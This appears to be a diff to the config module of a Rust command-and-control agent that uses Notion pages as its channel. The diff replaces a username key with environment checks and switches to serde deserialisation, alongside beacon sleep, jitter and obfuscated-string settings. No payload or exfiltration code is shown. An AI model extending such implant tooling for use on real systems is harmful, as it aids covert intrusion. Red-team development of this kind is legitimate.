@@ -3,9 +3,10 @@ use std::io::{self, Write};
 use std::fs;
 use std::fmt;
 use serde::{Deserialize, Serialize};
-use serde_json::{Value, to_string, to_value};
+use serde_json::{to_string, from_str};
 use base64::encode;
 use litcrypt::lc;
+use crate::env_check::EnvCheck;
 
 // Config consts
 pub const URL_BASE: &str = "https://api.notion.com/v1";
@@ -15,7 +16,22 @@ pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
 pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
 pub const DEFAULT_LOG_LEVEL: &str = "<<LOG_LEVEL>>";
 pub const CONFIG_FILE_PATH: &str = "./cfg.json";
-pub const DEFAULT_KEY_USERNAME: &str = "<<KEY_USERNAME>>";
+pub const DEFAULT_ENV_CHECKS: &str = "<<DEFAULT_ENV_CHECKS>>";
+
+/// Enum for ConfigOptions, useful for parsing configs from 
+/// arbitrary data.
+#[derive(Debug, Serialize, Deserialize)]
+pub enum ConfigOption {
+    ApiKey(String),
+    ParentPage(String),
+    Sleep(u64),
+    Jitter(u64),
+    LaunchApp(bool),
+    ConfigPath(String),
+    LogLevel(u64),
+    EnvChecks(Vec<EnvCheck>)
+}
+
 
 /// Storing Config Options as a struct for ergonomics.
 ///
@@ -27,15 +43,16 @@ pub const DEFAULT_KEY_USERNAME: &str = "<<KEY_USERNAME>>";
 /// 
 #[derive(Debug, Serialize, Deserialize)]
 pub struct ConfigOptions {
+    pub api_key: String,
+    pub parent_page_id: String,
     pub sleep_interval: u64,
     pub jitter_time: u64,
-    pub parent_page_id: String,
-    pub api_key: String,
-    pub config_file_path: String,
     pub launch_app: bool,
     pub log_level: u64,
-    pub key_username: String
+    pub config_file_path: String,
+    pub env_checks: Vec<EnvCheck>
 }
+
 
 #[derive(Debug)]
 pub struct ConfigError(String);
@@ -49,26 +66,6 @@ impl fmt::Display for ConfigError {
 impl Error for ConfigError {}
 
 impl ConfigOptions {
-
-    /// Converts loaded json data into `ConfigOptions`
-    pub fn from_json(j: Value) -> ConfigOptions {
-        println!("{:?}", j);
-        ConfigOptions {
-            sleep_interval: j["sleep_interval"].as_u64().unwrap(),
-            jitter_time: j["jitter_time"].as_u64().unwrap(),
-            parent_page_id: j["parent_page_id"].to_string().replace('"', ""),
-            api_key: j["api_key"].to_string().replace('"', ""),
-            config_file_path: j["config_file_path"].to_string().replace('"', ""),
-            launch_app: j["launch_app"].as_bool().unwrap_or_default(),
-            log_level: j["log_level"].as_u64().unwrap_or_else(|| 4), // Info as default log level
-            key_username: j["key_username"].to_string().replace('"', ""),
-        }
-    }
-
-    /// Produces the Jsonified version of the ConfigOptions
-    pub fn to_json(&self) -> Value {
-        to_value(self).unwrap()
-    }
 
     /// Produces a base64 encoded String of the Options.
     ///
@@ -132,7 +129,7 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
             config_file_path: config_file_path.trim().to_string(),
             launch_app: false,
             log_level: log_level.trim().parse().unwrap(),
-            key_username: key_username.trim().to_string()
+            env_checks: Vec::new()
         }
     )
 }
@@ -147,7 +144,7 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
         config_file_path: CONFIG_FILE_PATH.to_string(),
         launch_app: true,
         log_level: DEFAULT_LOG_LEVEL.parse().unwrap_or_else(|_| 2),
-        key_username: DEFAULT_KEY_USERNAME.to_string()
+        env_checks: from_str(DEFAULT_ENV_CHECKS).unwrap_or_else(|_| Vec::new())
     };
     
     Ok(config_options)
@@ -166,8 +163,8 @@ pub async fn load_config_options(c: Option<&str>) -> Result<ConfigOptions, Confi
     };
 
     if let Ok(c) = fs::read_to_string(config_file_path) {
-        if let Ok(cfg) = serde_json::from_str(c.as_str()) {
-            Ok(ConfigOptions::from_json(cfg))
+        if let Ok(cfg ) = from_str::<ConfigOptions>(c.as_str()) {
+            Ok(cfg)
         } else {
 
             // Create ad-hoc encryption since we don't have a logger
